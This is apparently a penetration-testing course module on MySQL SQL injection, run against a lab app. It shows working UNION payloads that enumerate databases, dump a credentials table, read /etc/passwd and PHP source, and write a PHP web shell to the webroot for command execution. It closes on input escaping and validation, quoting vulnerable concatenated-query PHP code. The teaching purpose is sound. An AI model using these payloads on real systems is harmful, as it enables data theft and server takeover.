+<p>In the previous sections, we learned about different SQL queries in <code>MySQL</code> and SQL injections and how to use them. This section will put all of that to use and gather data from the database using SQL queries within SQL injections.</p>
+<hr>
+<h3 id="mysql-fingerprinting">MySQL Fingerprinting</h3>
+<p>Before enumerating the database, we usually need to identify the type of DBMS we are dealing with. This is because each DBMS has different queries, and knowing what it is will help us know what queries to use.</p>
+<p>As an initial guess, if the webserver we see in HTTP responses is <code>Apache</code> or <code>Nginx</code>, it is a good guess that the webserver is running on Linux, so the DBMS is likely <code>MySQL</code>. The same also applies to Microsoft DBMS if the webserver is <code>IIS</code>, so it is likely to be <code>MSSQL</code>. However, this is a far-fetched guess, as many other databases can be used on either operating system or web server. So, there are different queries we can test to fingerprint the type of database we are dealing with.</p>
+<p>As we cover <code>MySQL</code> in this module, let us fingerprint <code>MySQL</code> databases. The following queries and their output will tell us that we are dealing with <code>MySQL</code>:</p>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>When to Use</th>
+<th>Expected Output</th>
+<th>Wrong Output</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>SELECT @@version</code></td>
+<td>When we have full query output</td>
+<td>MySQL Version 'i.e. <code>10.3.22-MariaDB-1ubuntu1</code>'</td>
+<td>In MSSQL it returns MSSQL version. Error with other DBMS.</td>
+</tr>
+<tr>
+<td><code>SELECT POW(1,1)</code></td>
+<td>When we only have numeric output</td>
+<td><code>1</code></td>
+<td>Error with other DBMS</td>
+</tr>
+<tr>
+<td><code>SELECT SLEEP(5)</code></td>
+<td>Blind/No Output</td>
+<td>Delays page response for 5 seconds and returns <code>0</code>.</td>
+<td>Will not delay response with other DBMS</td>
+</tr>
+</tbody>
+</table>
+<p>As we saw in the example from the previous section, when we tried <code>@@version</code>, it gave us:</p>
+<p><img src="storage\modules\33\db\_version\_1.jpg" alt=""></p>
+<p>The output <code>10.3.22-MariaDB-1ubuntu1</code> means that we are dealing with a <code>MariaDB</code> DBMS similar to MySQL. Since we have direct query output, we will not have to test the other payloads. Instead, we can test them and see what we get.</p>
+<hr>
+<h3 id="information-_schema-database">INFORMATION_SCHEMA Database</h3>
+<p>To pull data from tables using <code>UNION SELECT</code>, we need to properly form our <code>SELECT</code> queries. To do so, we need the following information:</p>
+<ul>
+<li>List of databases</li>
+<li>List of tables within each database</li>
+<li>List of columns within each table</li>
+</ul>
+<p>With the above information, we can form our <code>SELECT</code> statement to dump data from any column in any table within any database inside the DBMS. This is where we can utilize the <code>INFORMATION_SCHEMA</code> Database.</p>
+<p>The <a href="https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html">INFORMATION_SCHEMA</a> database contains metadata about the databases and tables present on the server. This database plays a crucial role while exploiting SQL injection vulnerabilities. As this is a different database, we cannot call its tables directly with a <code>SELECT</code> statement. If we only specify a table's name for a <code>SELECT</code> statement, it will look for tables within the same database.</p>
+<p>So, to reference a table present in another DB, we can use the dot ‘<code>.</code>’ operator. For example, to <code>SELECT</code> a table <code>users</code> present in a database named <code>my_database</code>, we can use:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> my_database.users;
+</code></pre>
+<p>Similarly, we can look at tables present in the <code>INFORMATION_SCHEMA</code> Database.</p>
+<hr>
+<h3 id="schemata">SCHEMATA</h3>
+<p>To start our enumeration, we should find what databases are available on the DBMS. The table <a href="https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html">SCHEMATA</a> in the <code>INFORMATION_SCHEMA</code> database contains information about all databases on the server. It is used to obtain database names so we can then query them. The <code>SCHEMA_NAME</code> column contains all the database names currently present.</p>
+<p>Let us first test this on a local database to see how the query is used:</p>
+<p>Database Enumeration</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT SCHEMA<span class="hljs-emphasis">_NAME FROM INFORMATION_</span>SCHEMA.SCHEMATA;
+
+<span class="hljs-code">+--------------------+</span>
+<span class="hljs-section">| SCHEMA_NAME        |
++--------------------+</span>
+| mysql              |
+| information<span class="hljs-emphasis">_schema |
+| performance_</span>schema |
+| ilfreight          |
+<span class="hljs-section">| dev                |
++--------------------+</span>
+6 rows in set (0.01 sec)
+</code></pre>
+<p>We see the <code>ilfreight</code> and <code>dev</code> databases.</p>
+<p>Note: The first three databases are default MySQL databases and are present on any server, so we usually ignore them during DB enumeration. Sometimes there's a fourth 'sys' DB as well.</p>
+<p>Now, let's do the same using a <code>UNION</code> SQL injection, with the following payload:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">cn' UNION select <span class="hljs-number">1</span>,schema_name,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> from INFORMATION_SCHEMA.SCHEMATA-- -
+</code></pre>
+<p><img src="storage\modules\33\ports\_dbs.png" alt=""></p>
+<p>Once again, we see two databases, <code>ilfreight</code> and <code>dev</code>, apart from the default ones. Let us find out which database the web application is running to retrieve ports data from. We can find the current database with the <code>SELECT database()</code> query. We can do this similarly to how we found the DBMS version in the previous section:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">cn' UNION select <span class="hljs-number">1</span>,database(),<span class="hljs-number">2</span>,<span class="hljs-number">3</span>-- -
+</code></pre>
+<p><img src="storage\modules\33\db\_name.jpg" alt=""></p>
+<p>We see that the database name is <code>ilfreight</code>. However, the other database (<code>dev</code>) looks interesting. So, let us try to retrieve the tables from it.</p>
+<hr>
+<h3 id="tables">TABLES</h3>
+<p>Before we dump data from the <code>dev</code> database, we need to get a list of the tables to query them with a <code>SELECT</code> statement. To find all tables within a database, we can use the <code>TABLES</code> table in the <code>INFORMATION_SCHEMA</code> Database.</p>
+<p>The <a href="https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html">TABLES</a> table contains information about all tables throughout the database. This table contains multiple columns, but we are interested in the <code>TABLE_SCHEMA</code> and <code>TABLE_NAME</code> columns. The <code>TABLE_NAME</code> column stores table names, while the <code>TABLE_SCHEMA</code> column points to the database each table belongs to. This can be done similarly to how we found the database names. For example, we can use the following payload to find the tables within the <code>dev</code> database:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">cn' UNION <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,TABLE_NAME,TABLE_SCHEMA,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> INFORMATION_SCHEMA.TABLES <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">'dev'</span><span class="hljs-comment">-- -</span>
+</code></pre>
+<p>Note how we replaced the numbers '2' and '3' with 'TABLE_NAME' and 'TABLE_SCHEMA', to get the output of both columns in the same query.</p>
+<p><img src="storage\modules\33\ports\_tables\_1.jpg" alt=""></p>
+<p>Note: we added a (where table_schema='dev') condition to only return tables from the 'dev' database, otherwise we would get all tables in all databases, which can be many.</p>
+<p>We see four tables in the dev database, namely <code>credentials</code>, <code>framework</code>, <code>pages</code>, and <code>posts</code>. For example, the <code>credentials</code> table could contain sensitive information to look into it.</p>
+<hr>
+<h3 id="columns">COLUMNS</h3>
+<p>To dump the data of the <code>credentials</code> table, we first need to find the column names in the table, which can be found in the <code>COLUMNS</code> table in the <code>INFORMATION_SCHEMA</code> database. The <a href="https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html">COLUMNS</a> table contains information about all columns present in all the databases. This helps us find the column names to query a table for. The <code>COLUMN_NAME</code>, <code>TABLE_NAME</code>, and <code>TABLE_SCHEMA</code> columns can be used to achieve this. As we did before, let us try this payload to find the column names in the <code>credentials</code> table:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">cn' UNION <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA <span class="hljs-keyword">from</span> INFORMATION_SCHEMA.COLUMNS <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'credentials'</span><span class="hljs-comment">-- -</span>
+</code></pre>
+<p><img src="storage\modules\33\ports\_columns\_1.jpg" alt=""></p>
+<p>The table has two columns named <code>username</code> and <code>password</code>. We can use this information and dump data from the table.</p>
+<hr>
+<h3 id="data">Data</h3>
+<p>Now that we have all the information, we can form our <code>UNION</code> query to dump data of the <code>username</code> and <code>password</code> columns from the <code>credentials</code> table in the <code>dev</code> database. We can place <code>username</code> and <code>password</code> in place of columns 2 and 3:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">cn' UNION <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>, username, <span class="hljs-keyword">password</span>, <span class="hljs-number">4</span> <span class="hljs-keyword">from</span> dev.credentials<span class="hljs-comment">-- -</span>
+</code></pre>
+<p>Remember: don't forget to use the dot operator to refer to the 'credentials' in the 'dev' database, as we are running in the 'ilfreight' database, as previously discussed.</p>
+<p><img src="storage\modules\33\ports\_credentials\_1.png" alt=""></p>
+<p>We were able to get all the entries in the <code>credentials</code> table, which contains sensitive information such as password hashes and an API key.</p>
+<h2 id="reading-files">Reading Files</h2>
+<hr>
+<p>In addition to gathering data from various tables and databases within the DBMS, a SQL Injection can also be leveraged to perform many other operations, such as reading and writing files on the server and even gaining remote code execution on the back-end server.</p>
+<hr>
+<h3 id="privileges">Privileges</h3>
+<p>Reading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMSes, as it can lead to system exploitation, as we will see. For example, in <code>MySQL</code>, the DB user must have the <code>FILE</code> privilege to load a file's content into a table and then dump data from that table and read files. So, let us start by gathering data about our user privileges within the database to decide whether we will read and/or write files to the back-end server.</p>
+<p><strong>DB User</strong></p>
+<p>First, we have to determine which user we are within the database. While we do not necessarily need database administrator (DBA) privileges to read data, this is becoming more required in modern DBMSes, as only DBA are given such privileges. The same applies to other common databases. If we do have DBA privileges, then it is much more probable that we have file-read privileges. If we do not, then we have to check our privileges to see what we can do. To be able to find our current DB user, we can use any of the following queries:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">USER</span>()
+<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">CURRENT_USER</span>()
+<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> mysql.user
+</code></pre>
+<p>Our <code>UNION</code> injection payload will be as follows:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">cn' UNION SELECT <span class="hljs-number">1</span>, user(), <span class="hljs-number">3</span>, <span class="hljs-number">4</span>-- -
+</code></pre>
+<p>or:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">cn' UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>, <span class="hljs-keyword">user</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span> <span class="hljs-keyword">from</span> mysql.user<span class="hljs-comment">-- -</span>
+</code></pre>
+<p>Which tells us our current user, which in this case is <code>root</code>:</p>
+<p><img src="storage\modules\33\db\_user.jpg" alt=""></p>
+<p>This is very promising, as a root user is likely to be a DBA, which gives us many privileges.</p>
+<p><strong>User Privileges</strong></p>
+<p>Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">SELECT super_priv <span class="hljs-keyword">FROM</span> mysql.<span class="hljs-keyword">user</span>
+</code></pre>
+<p>Once again, we can use the following payload with the above query:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">cn' UNION SELECT <span class="hljs-number">1</span>, super_priv, <span class="hljs-number">3</span>, <span class="hljs-number">4</span> FROM mysql.user-- -
+</code></pre>
+<p>If we had many users within the DBMS, we can add <code>WHERE user="root"</code> to only show privileges for our current user <code>root</code>:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">cn' UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>, super_priv, <span class="hljs-number">3</span>, <span class="hljs-number">4</span> <span class="hljs-keyword">FROM</span> mysql.user <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">"root"</span><span class="hljs-comment">-- -</span>
+</code></pre>
+<p><img src="storage\modules\33\root\_privs.jpg" alt=""></p>
+<p>The query returns <code>Y</code>, which means <code>YES</code>, indicating superuser privileges. We can also dump other privileges we have directly from the schema, with the following query:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-title">cn'</span> <span class="hljs-type">UNION</span> <span class="hljs-type">SELECT</span> <span class="hljs-number">1</span>, grantee, privilege_<span class="hljs-keyword">type</span>, 4 <span class="hljs-type">FROM</span> information_schema.user_privileges<span class="hljs-comment">-- -</span>
+</code></pre>
+<p>From here, we can add <code>WHERE grantee="'root'@'localhost'"</code> to only show our current user <code>root</code> privileges. Our payload would be:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">cn' UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>, grantee, privilege_type, <span class="hljs-number">4</span> <span class="hljs-keyword">FROM</span> information_schema.user_privileges <span class="hljs-keyword">WHERE</span> grantee=<span class="hljs-string">"'root'@'localhost'"</span><span class="hljs-comment">-- -</span>
+</code></pre>
+<p>And we see all of the possible privileges given to our current user:</p>
+<p><img src="storage\modules\33\root\_privs\_2.jpg" alt=""></p>
+<p>We see that the <code>FILE</code> privilege is listed for our user, enabling us to read files and potentially even write files. Thus, we can proceed with attempting to read files.</p>
+<hr>
+<h3 id="load-_file">LOAD_FILE</h3>
+<p>Now that we know we have enough privileges to read local system files, let us do that using the <code>LOAD_FILE()</code> function. The <a href="https://mariadb.com/kb/en/load\_file/">LOAD_FILE()</a> function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name. The following query is an example of how to read the <code>/etc/passwd</code> file:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">LOAD_FILE</span>(<span class="hljs-string">'/etc/passwd'</span>);
+</code></pre>
+<p>Note: We will only be able to read the file if the OS user running MySQL has enough privileges to read it.</p>
+<p>Similar to how we have been using a <code>UNION</code> injection, we can use the above query:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">cn' UNION SELECT <span class="hljs-number">1</span>, LOAD_FILE(<span class="hljs-string">"/etc/passwd"</span>), <span class="hljs-number">3</span>, <span class="hljs-number">4</span>-- -
+</code></pre>
+<p><img src="storage\modules\33\load\_file\_sqli.png" alt=""></p>
+<p>We were able to successfully read the contents of the passwd file through the SQL injection. Unfortunately, this can be potentially used to leak the application source code as well.</p>
+<hr>
+<h3 id="another-example">Another Example</h3>
+<p>We know that the current page is <code>search.php</code>. The default Apache webroot is <code>/var/www/html</code>. Let us try reading the source code of the file at <code>/var/www/html/search.php</code>.</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">cn' UNION SELECT <span class="hljs-number">1</span>, LOAD_FILE(<span class="hljs-string">"/var/www/html/search.php"</span>), <span class="hljs-number">3</span>, <span class="hljs-number">4</span>-- -
+</code></pre>
+<p><img src="storage\modules\33\load\_file\_search.png" alt=""></p>
+<p>However, the page ends up rendering the HTML code within the browser. The HTML source can be viewed by hitting <code>[Ctrl + U]</code>.</p>
+<p><img src="storage\modules\33\load\_file\_source.png" alt="load\_file\_source"></p>
+<p>The source code shows us the entire PHP code, which could be inspected further to find sensitive information like database connection credentials or find more vulnerabilities.</p>
+<ol>
+<li>\
+Page 15</li>
+<li>Writing Files</li>
+</ol>
+<h2 id="writing-files">Writing Files</h2>
+<hr>
+<p>When it comes to writing files to the back-end server, it becomes much more restricted in modern DBMSes, since we can utilize this to write a web shell on the remote server, hence getting code execution and taking over the server. This is why modern DBMSes disable file-write by default and require certain privileges for DBA's to write files. Before writing files, we must first check if we have sufficient rights and if the DBMS allows writing files.</p>
+<hr>
+<h3 id="write-file-privileges">Write File Privileges</h3>
+<p>To be able to write files to the back-end server using a MySQL database, we require three things:</p>
+<ol>
+<li>User with <code>FILE</code> privilege enabled</li>
+<li>MySQL global <code>secure_file_priv</code> variable not enabled</li>
+<li>Write access to the location we want to write to on the back-end server</li>
+</ol>
+<p>We have already found that our current user has the <code>FILE</code> privilege necessary to write files. We must now check if the MySQL database has that privilege. This can be done by checking the <code>secure_file_priv</code> global variable.</p>
+<p><strong>secure_file_priv</strong></p>
+<p>The <a href="https://mariadb.com/kb/en/server-system-variables/#secure\_file\_priv">secure_file_priv</a> variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, <code>NULL</code> means we cannot read/write from any directory. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the <code>FILE</code> privilege. However, <code>MySQL</code> uses <code>/var/lib/mysql-files</code> as the default folder. This means that reading files through a <code>MySQL</code> injection isn't possible with default settings. Even worse, some modern configurations default to <code>NULL</code>, meaning that we cannot read/write files anywhere within the system.</p>
+<p>So, let's see how we can find out the value of <code>secure_file_priv</code>. Within <code>MySQL</code>, we can use the following query to obtain the value of this variable:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">SHOW</span> <span class="hljs-keyword">VARIABLES</span> <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'secure_file_priv'</span>;
+</code></pre>
+<p>However, as we are using a <code>UNION</code> injection, we have to get the value using a <code>SELECT</code> statement. This shouldn't be a problem, as all variables and most configurations' are stored within the <code>INFORMATION_SCHEMA</code> database. <code>MySQL</code> global variables are stored in a table called <a href="https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html">global_variables</a>, and as per the documentation, this table has two columns <code>variable_name</code> and <code>variable_value</code>.</p>
+<p>We have to select these two columns from that table in the <code>INFORMATION_SCHEMA</code> database. There are hundreds of global variables in a MySQL configuration, and we don't want to retrieve all of them. We will then filter the results to only show the <code>secure_file_priv</code> variable, using the <code>WHERE</code> clause we learned about in a previous section.</p>
+<p>The final SQL query is the following:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">SELECT <span class="hljs-keyword">variable</span><span class="hljs-number">_n</span>ame, <span class="hljs-keyword">variable</span><span class="hljs-number">_</span><span class="hljs-keyword">value</span> FROM information<span class="hljs-number">_</span>schema.global<span class="hljs-number">_</span>variables where <span class="hljs-keyword">variable</span><span class="hljs-number">_n</span>ame=<span class="hljs-string">"secure_file_priv"</span>
+</code></pre>
+<p>So, similar to other <code>UNION</code> injection queries, we can get the above query result with the following payload. Remember to add two more columns <code>1</code> &amp; <code>4</code> as junk data to have a total of 4 columns':</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">cn' UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>, variable_name, variable_value, <span class="hljs-number">4</span> <span class="hljs-keyword">FROM</span> information_schema.global_variables <span class="hljs-keyword">where</span> variable_name=<span class="hljs-string">"secure_file_priv"</span><span class="hljs-comment">-- -</span>
+</code></pre>
+<p><img src="storage\modules\33\secure\_file\_priv.jpg" alt=""></p>
+<p>And the result shows that the <code>secure_file_priv</code> value is empty, meaning that we can read/write files to any location.</p>
+<hr>
+<h3 id="select-into-outfile">SELECT INTO OUTFILE</h3>
+<p>Now that we have confirmed that our user should write files to the back-end server, let's try to do that using the <code>SELECT .. INTO OUTFILE</code> statement. The <a href="https://mariadb.com/kb/en/select-into-outfile/">SELECT INTO OUTFILE</a> statement can be used to write data from select queries into files. This is usually used for exporting data from tables.</p>
+<p>To use it, we can add <code>INTO OUTFILE '...'</code> after our query to export the results into the file we specified. The below example saves the output of the <code>users</code> table into the <code>/tmp/credentials</code> file:</p>
+<p>Writing Files</p>
+<pre><code class="lang-shell-session"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">OUTFILE</span> <span class="hljs-string">'/tmp/credentials'</span>;
+</code></pre>
+<p>If we go to the back-end server and <code>cat</code> the file, we see that table's content:</p>
+<p>Writing Files</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ cat /tmp/credentials 
+
+<span class="hljs-number">1</span>       admin   <span class="hljs-number">392037</span>dbba51f692776d6cefb6dd546d
+<span class="hljs-number">2</span>       newuser <span class="hljs-number">9</span>da2c9bcdf39d8610954e0e11ea8f45f
+</code></pre>
+<p>It is also possible to directly <code>SELECT</code> strings into files, allowing us to write arbitrary files to the back-end server.</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-string">'this is a test'</span> <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">OUTFILE</span> <span class="hljs-string">'/tmp/test.txt'</span>;
+</code></pre>
+<p>When we <code>cat</code> the file, we see that text:</p>
+<p>Writing Files</p>
+<pre><code class="lang-shell-session"><span class="hljs-symbol">root@</span>htb[/htb]$ cat /tmp/test.txt 
+
+<span class="hljs-keyword">this</span> <span class="hljs-keyword">is</span> a test
+</code></pre>
+<p>Writing Files</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">ls</span> -<span class="hljs-keyword">la</span> /tmp/<span class="hljs-keyword">test</span>.txt 
+
+-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/<span class="hljs-keyword">test</span>.txt
+</code></pre>
+<p>As we can see above, the <code>test.txt</code> file was created successfully and is owned by the <code>mysql</code> user.</p>
+<p>Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.</p>
+<hr>
+<h3 id="writing-files-through-sql-injection">Writing Files through SQL Injection</h3>
+<p>Let's try writing a text file to the webroot and verify if we have write permissions. The below query should write <code>file written successfully!</code> to the <code>/var/www/html/proof.txt</code> file, which we can then access on the web application:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">select</span> <span class="hljs-string">'file written successfully!'</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">'/var/www/html/proof.txt'</span>
+</code></pre>
+<p>Note: To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use <code>load_file</code> to read the server configuration, like Apache's configuration found at <code>/etc/apache2/apache2.conf</code>, Nginx's configuration at <code>/etc/nginx/nginx.conf</code>, or IIS configuration at <code>%WinDir%\System32\Inetsrv\Config\ApplicationHost.config</code>, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt">this wordlist for Linux</a> or <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt">this wordlist for Windows</a>. Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.</p>
+<p>The <code>UNION</code> injection payload would be as follows:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">cn' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-string">'file written successfully!'</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">'/var/www/html/proof.txt'</span><span class="hljs-comment">-- -</span>
+</code></pre>
+<p><img src="storage\modules\33\write\_proof.png" alt=""></p>
+<p>We don’t see any errors on the page, which indicates that the query succeeded. Checking for the file <code>proof.txt</code> in the webroot, we see that it indeed exists:</p>
+<p><img src="storage\modules\33\write\_proof\_text.png" alt=""></p>
+<p>Note: We see the string we dumped along with '1', '3' before it, and '4' after it. This is because the entire 'UNION' query result was written to the file. To make the output cleaner, we can use "" instead of numbers.</p>
+<hr>
+<h3 id="writing-a-web-shell">Writing a Web Shell</h3>
+<p>Having confirmed write permissions, we can go ahead and write a PHP web shell to the webroot folder. We can write the following PHP webshell to be able to execute commands directly on the back-end server:</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="php"><span class="hljs-meta">&lt;?php</span> system($_REQUEST[<span class="hljs-number">0</span>]); <span class="hljs-meta">?&gt;</span></span>
+</code></pre>
+<p>We can reuse our previous <code>UNION</code> injection payload, and change the string to the above, and the file name to <code>shell.php</code>:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">cn' union <span class="hljs-keyword">select</span> <span class="hljs-string">""</span>,<span class="hljs-string">'&lt;?php system($_REQUEST[0]); ?&gt;'</span>, <span class="hljs-string">""</span>, <span class="hljs-string">""</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">'/var/www/html/shell.php'</span><span class="hljs-comment">-- -</span>
+</code></pre>
+<p>', “ “, “ “ into outfile '/var/www/html/shell.php'-- -'&gt;<img src="storage\modules\33\write\_shell.png" alt=""></p>
+<p>Once again, we don't see any errors, which means the file write probably worked. This can be verified by browsing to the <code>/shell.php</code> file and executing commands via the <code>0</code> parameter, with <code>?0=id</code> in our URL:</p>
+<p><img src="storage\modules\33\write\_shell\_exec\_1.png" alt=""></p>
+<p>The output of the <code>id</code> command confirms that we have code execution and are running as the <code>www-data</code> user.</p>
+<h2 id="mitigating-sql-injection">Mitigating SQL Injection</h2>
+<hr>
+<p>We have learned about SQL injections, why they occur, and how we can exploit them. We should also learn how to avoid these types of vulnerabilities in our code and patch them when found. Let's look at some examples of how SQL Injection can be mitigated.</p>
+<hr>
+<h3 id="input-sanitization">Input Sanitization</h3>
+<p>Here's the snippet of the code from the authentication bypass section we discussed earlier:</p>
+<p>Code: php</p>
+<pre><code class="lang-php">&lt;SNIP&gt;
+  $username = $_POST[<span class="hljs-string">'username'</span>];
+  $password = $_POST[<span class="hljs-string">'password'</span>];
+
+  $query = <span class="hljs-string">"SELECT * FROM logins WHERE username='"</span>. $username. <span class="hljs-string">"' AND password = '"</span> . $password . <span class="hljs-string">"';"</span> ;
+  <span class="hljs-keyword">echo</span> <span class="hljs-string">"Executing query: "</span> . $query . <span class="hljs-string">"&lt;br /&gt;&lt;br /&gt;"</span>;
+
+  <span class="hljs-keyword">if</span> (!mysqli_query($conn ,$query))
+  {
+          <span class="hljs-keyword">die</span>(<span class="hljs-string">'Error: '</span> . mysqli_error($conn));
+  }
+
+  $result = mysqli_query($conn, $query);
+  $row = mysqli_fetch_array($result);
+&lt;SNIP&gt;
+</code></pre>
+<p>As we can see, the script takes in the <code>username</code> and <code>password</code> from the POST request and passes it to the query directly. This will let an attacker inject anything they wish and exploit the application. Injection can be avoided by sanitizing any user input, rendering injected queries useless. Libraries provide multiple functions to achieve this, one such example is the <a href="https://www.php.net/manual/en/mysqli.real-escape-string.php">mysqli_real_escape_string()</a> function. This function escapes characters such as <code>'</code> and <code>"</code>, so they don't hold any special meaning.</p>
+<p>Code: php</p>
+<pre><code class="lang-php">&lt;SNIP&gt;
+<span class="hljs-variable">$username</span> = mysqli_real_escape_string(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'username'</span>]);
+<span class="hljs-variable">$password</span> = mysqli_real_escape_string(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'password'</span>]);
+
+<span class="hljs-variable">$query</span> = <span class="hljs-string">"SELECT * FROM logins WHERE username='"</span>. <span class="hljs-variable">$username</span>. <span class="hljs-string">"' AND password = '"</span> . <span class="hljs-variable">$password</span> . <span class="hljs-string">"';"</span> ;
+<span class="hljs-built_in">echo</span> <span class="hljs-string">"Executing query: "</span> . <span class="hljs-variable">$query</span> . <span class="hljs-string">"&lt;br /&gt;&lt;br /&gt;"</span>;
+&lt;SNIP&gt;
+</code></pre>
+<p>The snippet above shows how the function can be used.</p>
+<p><img src="storage\modules\33\mysqli\_escape.png" alt="mysqli\_escape"></p>
+<p>As expected, the injection no longer works due to escaping the single quotes. A similar example is the <a href="https://www.php.net/manual/en/function.pg-escape-string.php">pg_escape_string()</a> which used to escape PostgreSQL queries.</p>
+<hr>
+<h3 id="input-validation">Input Validation</h3>
+<p>User input can also be validated based on the data used to query to ensure that it matches the expected input. For example, when taking an email as input, we can validate that the input is in the form of <code>...@email.com</code>, and so on.</p>
+<p>Consider the following code snippet from the ports page, which we used <code>UNION</code> injections on:</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">"port_code"</span>])) {
+    $q = <span class="hljs-string">"Select * from ports where port_code ilike '%"</span> . $_GET[<span class="hljs-string">"port_code"</span>] . <span class="hljs-string">"%'"</span>;
+    $result = pg_query($conn,$q);
+
+    <span class="hljs-keyword">if</span> (!$result)
+    {
+           <span class="hljs-keyword">die</span>(<span class="hljs-string">"&lt;/table&gt;&lt;/div&gt;&lt;p style='font-size: 15px;'&gt;"</span> . pg_last_error($conn). <span class="hljs-string">"&lt;/p&gt;"</span>);
+    }
+&lt;SNIP&gt;
+<span class="hljs-meta">?&gt;</span></span>
+</code></pre>
+<p>We see the GET parameter <code>port_code</code> being used in the query directly. It's already known that a port code consists only of letters or spaces. We can restrict the user input to only these characters, which will prevent the injection of queries. A regular expression can be used for validating the input:</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="hljs-variable">&lt;SNIP&gt;</span>
+<span class="hljs-variable">$pattern</span> = <span class="hljs-string">"/^[A-Za-z\s]+$/"</span>;
+<span class="hljs-variable">$code</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"port_code"</span>];
+
+if(!preg_match(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$code</span>)) {
+  die(<span class="hljs-string">"&lt;/table&gt;&lt;/div&gt;&lt;p style='font-size: 15px;'&gt;Invalid input! Please try again.&lt;/p&gt;"</span>);
+}
+
+<span class="hljs-variable">$q</span> = <span class="hljs-string">"Select * from ports where port_code ilike '%"</span> . <span class="hljs-variable">$code</span> . <span class="hljs-string">"%'"</span>;
